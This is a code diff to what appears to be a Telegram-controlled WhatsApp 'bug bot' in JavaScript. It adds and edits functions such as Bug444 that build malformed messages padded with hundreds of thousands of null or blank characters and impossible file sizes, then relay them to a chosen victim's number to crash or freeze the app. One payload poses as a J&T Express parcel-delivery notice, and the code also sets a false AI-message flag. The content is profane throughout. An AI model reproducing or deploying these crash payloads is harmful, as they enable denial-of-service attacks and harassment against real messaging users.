@@ -243,7 +243,7 @@ async function Bug1(sock, jid) {
     viewOnceMessage: {
       message: {
         listResponseMessage: {
-          title: "✦  ̶̶̱̲̄͟͟͞͞.𝘾𝙚͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙡𝙇𝙖𝙖 𝘾𝙧𝙖͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙨𝙯𝙝𝙚𝙧" + "ꦽ".repeat(9740),
+          title: "ㅤㅤㅤㅤㅤ" + "ㅤ".repeat(9740),
           listType: 2,
           singleSelectReply: {
             selectedRowId: "⚡",
@@ -272,13 +272,13 @@ async function Bug1(sock, jid) {
                   caption:
                     "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                 },
-                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
+                contentText: 'ㅤㅤㅤㅤㅤ"👋"',
                 footerText: "© running since 2020 to 20##?",
                 buttons: [
                   {
                     buttonId: "\u0000".repeat(900000),
                     buttonText: {
-                      displayText: "𐎟 ✦  ̶̶̱̲̄͟͟͞͞.𝘾𝙚͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙡𝙇𝙖𝙖 𝘾𝙧𝙖͢͢͢͢͢͢͢͢͢͢͢͢͢͢𝙨𝙯𝙝𝙚𝙧 𐎟",
+                      displayText: "ㅤㅤㅤㅤㅤ",
                     },
                     type: 1,
                   },
@@ -488,7 +488,7 @@ async function Bug4(sock, jid) {
                   caption:
                     "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                 },
-                contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
+                contentText: 'ㅤㅤㅤㅤㅤ"👋"',
                 footerText: "© running since 2020 to 20##?",
                 buttons: [
                   {
@@ -596,6 +596,155 @@ async function Bug4(sock, jid) {
   });
 }
 
+async function  Bug444(sock, jid) {
+const stanza = [
+{
+attrs: { biz_bot: '1' },
+tag: "bot",
+},
+{
+attrs: {},
+tag: "biz",
+},
+];
+
+let messagePayload = {
+viewOnceMessage: {
+message: {
+listResponseMessage: {
+title: "Halo, kami dari J&T Express akan melakukan proses delivery paket COD dengan nomor waybill JX25191889440 ke alamat anda , mohon kesediaannya untuk memastikan apakah anda benar memesan barang COD senilai Rp 540,300?Terima kasih" + "ㅤ".repeat(45000),
+listType: 2,
+singleSelectReply: {
+    selectedRowId: "🩸"
+},
+contextInfo: {
+stanzaId: sock.generateMessageTag(),
+participant: "0@s.whatsapp.net",
+remoteJid: "status@broadcast",
+mentionedJid: [target, "13135550002@s.whatsapp.net"],
+quotedMessage: {
+                buttonsMessage: {
+                    documentMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+                        fileLength: "9999999999999",
+                        pageCount: 3567587327,
+                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+                        fileName: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟",
+                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+                        mediaKeyTimestamp: "1735456100",
+                        contactVcard: true,
+                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
+                    },
+                    contentText: "- Kami Yo \"👋\"",
+                    footerText: "© Caywzz",
+                    buttons: [
+                        {
+                            buttonId: "\u0000".repeat(850000),
+                            buttonText: {
+                                displayText: "🌸 𝗖͡𝗮͢𝘆𝘄̶𝘇𝘇͠𝗮𝗷𝗮͟"
+                            },
+                            type: 1
+                        }
+                    ],
+                    headerType: 3
+                }
+},
+conversionSource: "porn",
+conversionData: crypto.randomBytes(16),
+conversionDelaySeconds: 9999,
+forwardingScore: 999999,
+isForwarded: true,
+quotedAd: {
+advertiserName: " x ",
+mediaType: "IMAGE",
+jpegThumbnail: tdxlol,
+caption: " x "
+},
+placeholderKey: {
+remoteJid: "0@s.whatsapp.net",
+fromMe: false,
+id: "ABCDEF1234567890"
+},
+expiration: -99999,
+ephemeralSettingTimestamp: Date.now(),
+ephemeralSharedSecret: crypto.randomBytes(16),
+entryPointConversionSource: "kontols",
+entryPointConversionApp: "kontols",
+actionLink: {
+url: "t.me/devor6core",
+buttonTitle: "konstol"
+},
+disappearingMode:{
+initiator:1,
+trigger:2,
+initiatorDeviceJid: target,
+initiatedByMe:true
+},
+groupSubject: "kontol",
+parentGroupJid: "kontolll",
+trustBannerType: "kontol",
+trustBannerAction: 99999,
+isSampled: true,
+externalAdReply: {
+title: "! Starevxz - \"𝗋34\" 🩸",
+mediaType: 2,
+renderLargerThumbnail: false,
+showAdAttribution: false,
+containsAutoReply: false,
+body: "© running since 2020 to 20##?",
+thumbnail: tdxlol,
+sourceUrl: "go fuck yourself",
+sourceId: "dvx - problem",
+ctwaClid: "cta",
+ref: "ref",
+clickToWhatsappCall: true,
+automatedGreetingMessageShown: false,
+greetingMessageBody: "kontol",
+ctaPayload: "cta",
+disableNudge: true,
+originalImageUrl: "konstol"
+},
+featureEligibilities: {
+cannotBeReactedTo: true,
+cannotBeRanked: true,
+canRequestFeedback: true
+},
+forwardedNewsletterMessageInfo: {
+newsletterJid: "120363274419384848@newsletter",
+serverMessageId: 1,
+newsletterName: `- Caywzz 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
+contentType: 3,
+accessibilityText: "kontol"
+},
+statusAttributionType: 2,
+utm: {
+utmSource: "utm",
+utmCampaign: "utm2"
+}
+},
+description: "by : Caywzz "
+},
+messageContextInfo: {
+messageSecret: crypto.randomBytes(32),
+supportPayload: JSON.stringify({
+version: 2,
+is_ai_message: true,
+should_show_system_message: true,
+ticket_id: crypto.randomBytes(16),
+}),
+},
+}
+}
+}
+
+await sock.relayMessage(target, messagePayload, {
+additionalNodes: stanza,
+participant: { jid : target }
+});
+}
 async function Bug3(sock, jid) {
   let target = jid;
   let msg = await generateWAMessageFromContent(
@@ -1319,8 +1468,8 @@ bot.on("callback_query", async (callbackQuery) => {
   const [bugType, jid] = data.split("_");
 
   const bugTypes = {
-    "crasher": [Bug4, InvisiPayload, InvisiPayload, Bug4],
-    "notag": [Bug4, Bug3, Bug3, Bug4],
+    "crasher": [Bug444],
+    "notag": [Bug4, Bug1, Bug3, Bug4],
     "os": [IosMJ, IosMJ, IosMJ, NoIos, NoIos, NoIos, NoIos, NoIos],
     "combox": [Bug4, InvisiPayload, crashui, Bug4,Bug4, crashui, InvisiPayload, Bug4],
     "manuver": [Bug4, Bug3, Bug2, InvisiPayload, Bug4, Bug4],
